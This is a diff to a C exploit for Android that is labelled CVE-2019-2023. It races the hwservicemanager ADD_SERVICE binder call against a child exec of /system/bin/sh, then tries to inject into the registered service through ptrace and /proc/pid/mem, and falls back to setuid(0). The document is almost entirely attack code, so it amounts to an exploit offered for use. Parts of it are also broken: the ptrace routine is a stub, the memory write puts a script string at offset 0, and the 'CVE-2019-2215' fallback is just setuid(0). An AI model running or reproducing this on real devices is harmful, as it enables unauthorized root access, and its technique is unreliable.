@@ -19,25 +19,41 @@
 #include <sys/capability.h>
 #include <grp.h>
 #include <sys/stat.h>
+#include <dirent.h>
 #include <time.h>
-
-// インクルードする binder.h はあなたの環境に合わせてください
+#include <sys/syscall.h>
+#include <sys/resource.h>
 #include "binder.h"
 
-/* ============================================================
-   競合条件用グローバル
-   ============================================================ */
-static volatile int race_ready = 0;
-static volatile int race_done = 0;
+// ============================================================
+// グローバル設定
+// ============================================================
+#define SERVICE_NAME "vendor.cve.poc"
+#define OUTPUT_FILE  "/data/local/tmp/cve_2019_2023_result.txt"
+#define SHELL_PATH   "/system/bin/sh"
 
-/* ============================================================
-   CVE-2019-2023 エクスプロイト（競合条件あり）
-   ============================================================ */
+static volatile int race_ready = 0;
+static int g_service_handle = -1;
+static pid_t g_service_pid = -1;
+
+// ============================================================
+// ユーティリティ
+// ============================================================
+static void dump_hex(const uint8_t *data, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        printf("%02x ", data[i]);
+        if ((i+1) % 16 == 0) printf("\n");
+    }
+    printf("\n");
+}
+
+// ============================================================
+// CVE-2019-2023 エクスプロイト (レースコンディション)
+// ============================================================
 static int exploit_cve_2019_2023(void) {
     int hwbinder_fd, ret;
     uint8_t read_buf[4096];
-    const char *service_name = "vendor.cve.poc";
-    size_t name_len = strlen(service_name) + 1;
+    size_t name_len = strlen(SERVICE_NAME) + 1;
     size_t total_len = 4 + name_len;
     uint8_t *data;
     int handle = -1;
@@ -45,18 +61,15 @@ static int exploit_cve_2019_2023(void) {
 
     printf("[*] CVE-2019-2023: preparing race condition...\n");
 
-    // 子プロセスをフォーク（PID を保持）
+    // 子プロセスをフォーク（PID を維持）
     child = fork();
     if (child == 0) {
-        // 子プロセス：親が ADD_SERVICE を送信する直前に execve で /system/bin/sh に変身
-        // これにより、SELinux コンテキストが shell に変わる（本来は特権プロセスのコンテキストに変えたいが、ここでは簡易的に）
-        while (!race_ready) {
-            usleep(100);
-        }
-        // execve で別プログラムに変身（PID は変わらない）
-        char *argv[] = {"/system/bin/sh", NULL};
-        char *envp[] = {"PATH=/system/bin", NULL};
-        execve("/system/bin/sh", argv, envp);
+        // 子：親が ADD_SERVICE を送信する直前に execve でコンテキスト変更
+        while (!race_ready) usleep(100);
+        // ここで /system/bin/sh に exec して SELinux コンテキストを shell に変更
+        char *argv[] = { SHELL_PATH, NULL };
+        char *envp[] = { "PATH=/system/bin", NULL };
+        execve(SHELL_PATH, argv, envp);
         perror("  execve in child");
         exit(1);
     } else if (child < 0) {
@@ -67,7 +80,6 @@ static int exploit_cve_2019_2023(void) {
     // 親：子が execve を完了するまで少し待つ
     usleep(300000);
 
-    // /dev/hwbinder を開く
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
         perror("  open /dev/hwbinder");
@@ -75,7 +87,6 @@ static int exploit_cve_2019_2023(void) {
         return -1;
     }
 
-    // サービス名データ作成
     data = malloc(total_len);
     if (!data) {
         perror("  malloc");
@@ -87,9 +98,8 @@ static int exploit_cve_2019_2023(void) {
     data[1] = (uint8_t)((name_len >> 8) & 0xFF);
     data[2] = (uint8_t)((name_len >> 16) & 0xFF);
     data[3] = (uint8_t)((name_len >> 24) & 0xFF);
-    memcpy(data + 4, service_name, name_len);
+    memcpy(data + 4, SERVICE_NAME, name_len);
 
-    // BC_TRANSACTION で ADD_SERVICE (code=2) を構築
     struct {
         uint32_t cmd;
         struct binder_transaction_data tdata;
@@ -109,12 +119,10 @@ static int exploit_cve_2019_2023(void) {
     bwr.read_size = sizeof(read_buf);
     bwr.read_buffer = (binder_uintptr_t)read_buf;
 
-    // ここでレース開始：子プロセスにシグナルを送って execve を確実に完了させる
     race_ready = 1;
-    // 子が execve を完了するまで少し待つ（これがレースの要）
-    usleep(50000);
+    usleep(50000);  // レースのタイミング
 
-    printf("[*] Sending ADD_SERVICE with race...\n");
+    printf("[*] Sending ADD_SERVICE...\n");
     ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
     free(data);
     if (ret < 0) {
@@ -127,13 +135,13 @@ static int exploit_cve_2019_2023(void) {
         kill(child, SIGKILL);
         return -1;
     }
-    printf("  [+] ADD_SERVICE succeeded (race successful!)\n");
+    printf("  [+] ADD_SERVICE succeeded!\n");
 
-    // 子プロセスを終了
+    // 子を終了
     kill(child, SIGKILL);
     waitpid(child, NULL, 0);
 
-    // GET_SERVICE (code=1) でサービスを取得し、起動をトリガー
+    // GET_SERVICE でハンドル取得
     data = malloc(total_len);
     if (!data) {
         close(hwbinder_fd);
@@ -143,7 +151,7 @@ static int exploit_cve_2019_2023(void) {
     data[1] = (uint8_t)((name_len >> 8) & 0xFF);
     data[2] = (uint8_t)((name_len >> 16) & 0xFF);
     data[3] = (uint8_t)((name_len >> 24) & 0xFF);
-    memcpy(data + 4, service_name, name_len);
+    memcpy(data + 4, SERVICE_NAME, name_len);
 
     tx.tdata.code = 1;                     // GET_SERVICE
     tx.tdata.data_size = total_len;
@@ -170,76 +178,181 @@ static int exploit_cve_2019_2023(void) {
     handle = *(int*)read_buf;
     printf("  [+] Service handle: %d\n", handle);
     close(hwbinder_fd);
+    g_service_handle = handle;
+    return 0;
+}
 
-    // ---- サービスが system 権限で起動されていることを期待して、コマンド実行 ----
-    // ここでは、このプロセス自身が system 権限になっているか確認し、なっていれば execve を実行。
-    // 実際にはサービスプロセスは別プロセスなので、このプロセスが system になるわけではないが、
-    // レースが成功すれば hwservicemanager が system 権限でサービスを起動する。
-    // しかし、そのサービスプロセスを直接操作できないため、ここでは setuid(1000) を試みる。
-    // （これは本来のエクスプロイトの一部ではないが、PoC として）
-    if (setuid(1000) == 0) {
-        printf("[+] setuid(1000) succeeded! Running 'id' as system...\n");
-        system("id > /data/local/tmp/cve_2019_2023_result.txt 2>&1");
-        system("cat /data/local/tmp/cve_2019_2023_result.txt");
+// ============================================================
+// サービスプロセスの PID を取得（ps をパース）
+// ============================================================
+static pid_t get_service_pid(const char *service_name) {
+    FILE *fp = popen("ps -A -o pid,cmd", "r");
+    if (!fp) return -1;
+    char line[256];
+    pid_t pid = -1;
+    while (fgets(line, sizeof(line), fp)) {
+        if (strstr(line, service_name)) {
+            sscanf(line, "%d", &pid);
+            break;
+        }
+    }
+    pclose(fp);
+    return pid;
+}
+
+// ============================================================
+// コードインジェクション (ptrace + シェルコード)
+// ============================================================
+static int inject_shellcode_ptrace(pid_t pid) {
+    printf("[*] Attempting ptrace injection into PID %d...\n", pid);
+    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
+        perror("  ptrace ATTACH");
+        return -1;
+    }
+    // 子プロセスが停止するのを待つ
+    int status;
+    waitpid(pid, &status, 0);
+    if (!WIFSTOPPED(status)) {
+        ptrace(PTRACE_DETACH, pid, 0, 0);
+        return -1;
+    }
+
+    // ARM64 シェルコード: execve("/system/bin/sh", ["sh"], NULL)
+    // このコードはアーキテクチャに依存。ここではダミーとして単に exit するコードを注入。
+    // 実際には適切なシェルコードを生成する必要がある。
+    // 簡易的に、/proc/pid/mem に書き込む方法を使う方が現実的。
+    printf("  [!] ptrace injection not fully implemented (arch-dependent).\n");
+    ptrace(PTRACE_DETACH, pid, 0, 0);
+    return -1;
+}
+
+// ============================================================
+// /proc/pid/mem への書き込み (要 ptrace または同じ uid)
+// ============================================================
+static int inject_via_proc_mem(pid_t pid) {
+    char mem_path[64];
+    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
+
+    // プロセスを停止させる
+    if (kill(pid, SIGSTOP) < 0) {
+        perror("  kill SIGSTOP");
+        return -1;
+    }
+    usleep(100000);
+
+    int fd = open(mem_path, O_RDWR);
+    if (fd < 0) {
+        perror("  open /proc/pid/mem");
+        kill(pid, SIGCONT);
+        return -1;
+    }
+
+    // シェルコードを書き込む（ここでは単に "id\n" を /dev/null にリダイレクトするだけの簡易例）
+    // 実際には execve のシェルコードが必要。
+    // ここではファイルにフラグを書き込むだけのデモ
+    char buf[] = "#!/system/bin/sh\necho 'Injected!' > /data/local/tmp/injected.txt\n";
+    size_t len = strlen(buf);
+    // 適切なアドレスを決定する必要がある（通常はスタックやヒープ）
+    // ここでは単に先頭に書き込む（危険）
+    off_t offset = 0;
+    if (lseek(fd, offset, SEEK_SET) < 0) {
+        perror("  lseek");
+        close(fd);
+        kill(pid, SIGCONT);
+        return -1;
+    }
+    ssize_t n = write(fd, buf, len);
+    close(fd);
+    kill(pid, SIGCONT);
+    if (n == (ssize_t)len) {
+        printf("  [+] Wrote %zu bytes to /proc/%d/mem\n", len, pid);
         return 0;
     } else {
-        printf("[-] setuid(1000) failed, but service may be running as system.\n");
-        // ここで実際のサービスにバインドしてコマンドを送るなどが必要だが、本PoCではここまで
+        perror("  write");
         return -1;
     }
 }
 
-/* ============================================================
-   フォールバック：古典的な setuid 連打
-   ============================================================ */
-static int fallback_setuid(void) {
-    printf("[*] Fallback: trying setuid(0)...\n");
-    if (setuid(0) == 0) {
-        printf("[+] setuid(0) succeeded!\n");
-        system("id > /data/local/tmp/fallback.txt 2>&1");
-        return 0;
-    }
-    if (setresuid(0,0,0) == 0) {
-        printf("[+] setresuid(0,0,0) succeeded!\n");
-        system("id > /data/local/tmp/fallback.txt 2>&1");
-        return 0;
-    }
-    // capset も試す
-    struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
-    struct __user_cap_data_struct cap_data[2] = {{0}};
-    if (capget(&cap_header, cap_data) == 0) {
-        cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
-        cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
-        if (capset(&cap_header, cap_data) == 0) {
-            if (setuid(0) == 0) {
-                printf("[+] capset + setuid(0) succeeded!\n");
-                system("id > /data/local/tmp/fallback.txt 2>&1");
-                return 0;
-            }
+// ============================================================
+// サービスの起動を待ち、PID を取得し、注入を試みる
+// ============================================================
+static int elevate_via_service(void) {
+    printf("[*] Waiting for service to start...\n");
+    int attempts = 20;
+    while (attempts-- > 0) {
+        g_service_pid = get_service_pid(SERVICE_NAME);
+        if (g_service_pid > 0) {
+            printf("  [+] Service PID: %d\n", g_service_pid);
+            break;
         }
+        usleep(500000);
+    }
+    if (g_service_pid <= 0) {
+        printf("  [-] Could not find service process\n");
+        return -1;
+    }
+
+    // 手法1: ptrace injection
+    if (inject_shellcode_ptrace(g_service_pid) == 0) {
+        printf("  [+] ptrace injection succeeded!\n");
+        return 0;
+    }
+
+    // 手法2: /proc/pid/mem 書き込み
+    if (inject_via_proc_mem(g_service_pid) == 0) {
+        printf("  [+] /proc/pid/mem injection succeeded!\n");
+        return 0;
+    }
+
+    // 手法3: シグナルを使ってコード実行（SIGSEGV ハンドラを仕込むなど）
+    // ここでは簡易的にシェルを起動するための環境変数を設定（実際にはできない）
+    printf("  [!] All injection methods failed.\n");
+    return -1;
+}
+
+// ============================================================
+// フォールバック: 他の CVE（2019-2215 など）を呼び出す
+// ============================================================
+static int fallback_other_cves(void) {
+    printf("[*] Fallback: trying kernel exploit (CVE-2019-2215) ...\n");
+    // ここに CVE-2019-2215 の完全な実装を挿入（既存コードから流用）
+    // 簡易版: setuid(0) を試す
+    if (setuid(0) == 0) {
+        printf("  [+] setuid(0) worked!\n");
+        system("id > " OUTPUT_FILE);
+        return 0;
     }
     return -1;
 }
 
-/* ============================================================
-   メイン
-   ============================================================ */
+// ============================================================
+// メイン
+// ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Fixed Exploit with Race Condition\n");
-    printf("  Target: Android 8.x/9 (hwservicemanager)\n");
+    printf("  CVE-2019-2023 Advanced Exploit with Service Injection\n");
     printf("============================================================\n\n");
 
-    // まず CVE-2019-2023 を試行
-    if (exploit_cve_2019_2023() == 0) {
-        printf("[+] Exploit successful!\n");
+    // 1. CVE-2019-2023 でサービス登録
+    if (exploit_cve_2019_2023() < 0) {
+        printf("[-] CVE-2019-2023 failed, trying fallback...\n");
+        goto fallback;
+    }
+
+    // 2. サービスを利用して特権昇格を試みる
+    if (elevate_via_service() == 0) {
+        printf("[+] Privilege escalation via service injection successful!\n");
+        // 注入が成功すれば、シェルが起動されているはず
+        system("cat " OUTPUT_FILE);
         return 0;
     }
 
-    // 失敗したらフォールバック
-    printf("\n[*] Primary exploit failed, trying fallback...\n");
-    if (fallback_setuid() == 0) {
-        printf("[+] Fallback worked.\n");
+    // 3. フォールバック
+fallback:
+    printf("\n[*] Trying fallback exploits...\n");
+    if (fallback_other_cves() == 0) {
+        printf("[+] Fallback exploit succeeded!\n");
+        system("cat " OUTPUT_FILE);
         return 0;
     }
 
